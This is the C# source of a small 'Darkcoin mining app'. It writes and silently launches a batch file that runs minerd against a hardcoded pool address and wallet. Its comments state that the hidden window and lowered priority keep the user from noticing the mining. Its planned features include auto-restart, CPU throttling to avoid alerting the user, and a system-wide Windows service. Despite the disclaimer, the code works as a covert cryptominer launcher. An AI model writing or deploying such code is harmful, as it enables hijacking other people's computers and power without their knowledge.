using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
/*
This code is licensed under Creative Commons Attribution-ShareAlike 4.0 International License
More info and a human readable copy: https://creativecommons.org/licenses/by-sa/4.0/
THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED.
Use at your own risk I am not responsable for any damages or problems problems with this code.
*/
namespace Darkcoin_mining_app
{
    class Program
    {
        static void Main(string[] args)
        {
            //This code is for a darkcoin p2pool node. It can be easily modified for a different coin or pool. 
            //The purpose of this is to be able to easily get multiple computers mining, If you  are trying to make individual specific worker passwords than it might be faster to jus twrite the batch file.
            //This could be used to mine in the background but is not meant to be used malicously.
            string directory = Directory.GetCurrentDirectory(); //gets current directory and assigns it to a variable
            Console.WriteLine(directory);


            //creates a random integer to be used as the password. Works because p2pool passwords don't matter. 
            Random genminerPWD = new Random();
            int minerPWD = genminerPWD.Next(100000000, 900000000);
            Console.WriteLine(minerPWD);

            //writes batch file with random password to run minerd (should be in current directory)
            StreamWriter batch = new StreamWriter(directory + @"\mine.bat");
            batch.WriteLine("minerd.exe -a X11 -o stratum+tcp://D-R-K.org:7903 -u XgProPX7zBoKde1idTnNgVRGDbZ5rgEqJH -p " + minerPWD);
            batch.WriteLine("Pause");
            batch.Close();

            //starts process for the miner, hides the window to make it unnoticable
            Process mineprocess = new Process();
            mineprocess.StartInfo.CreateNoWindow = true;
            //mineprocess.PriorityClass = ProcessPriorityClass.BelowNormal; //not needed/broken
            System.Diagnostics.Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.BelowNormal; //will use less cpu if in demand, usefull if you want the user not to know mining is happening(if not comment out)
            mineprocess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            mineprocess.StartInfo.FileName = (directory + @"\mine.bat");
            mineprocess.Start();


            //Next 8 lines not working currently
            //public void checkrun()
            //{
            //    Process[] pname = Process.GetProcessesByName("minerd");
            //        if (pname.Length == 0);
            //    //Console.WriteLine("nothing"); //not needed
            //    else
            //        mineprocess.Start();
            //}


            //would be there so output can he viewed, right now not necesary
            //Console.ReadLine();

            /*
            Plans for the future updates
             *possible limit cpu usage as not to kill performance and alert user(done)
             *Cleck if miner is running and start running it if stopped
             *possibly make a windows service for all users
            */
        }
    }
}
